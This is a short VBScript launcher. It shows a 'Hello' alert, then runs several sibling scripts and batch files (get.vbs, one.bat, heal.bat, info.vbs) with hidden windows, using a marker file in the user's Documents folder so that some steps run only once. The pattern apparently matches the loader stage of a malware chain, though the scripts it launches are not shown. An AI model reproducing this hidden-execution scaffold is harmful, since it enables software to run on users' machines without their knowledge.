Alert "Hello"
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get the current folder path
strFolder = objFSO.GetParentFolderName(WScript.ScriptFullName)

' Retrieve the user profile path
userProfile = objShell.ExpandEnvironmentStrings("%userprofile%")

' Define paths for the files in the Scripts directory within Documents
scriptDir = userProfile & "\Documents\Scripts"
txtFile = scriptDir & "\sts.txt"
batFile = strFolder & "\one.bat"
getVbsFile = strFolder & "\get.vbs" ' Path to the .vbs file

' Ensure the Scripts directory exists
If Not objFSO.FolderExists(scriptDir) Then
    objFSO.CreateFolder(scriptDir)
End If

' Check if the txt file exists
If Not objFSO.FileExists(txtFile) Then
    ' Run the get.vbs file if it exists
    If objFSO.FileExists(getVbsFile) Then
        ' Run the get.vbs script silently
        objShell.Run """" & getVbsFile & """", 0, True ' Run the .vbs file synchronously
    End If

    ' Run the batch file silently
    objShell.Run """" & batFile & """", 0, False

    ' Create the txt file to indicate the batch file has been run
    Set markerFile = objFSO.CreateTextFile(txtFile)
    markerFile.WriteLine "Batch file executed."
    markerFile.Close
End If

' Define path for the heal.bat file
batFilePath = strFolder & "\heal.bat"

' Execute the batch file silently
objShell.Run """" & batFilePath & """", 0, False

' Now silently execute the target .vbs script from here (replace with correct path)
Dim targetVbsPath
targetVbsPath = strFolder & "\info.vbs" ' Replace with your target .vbs script path

' Run the target .vbs script silently (0 means no window, 1 means normal window)
objShell.Run "wscript.exe """ & targetVbsPath & """", 0, False

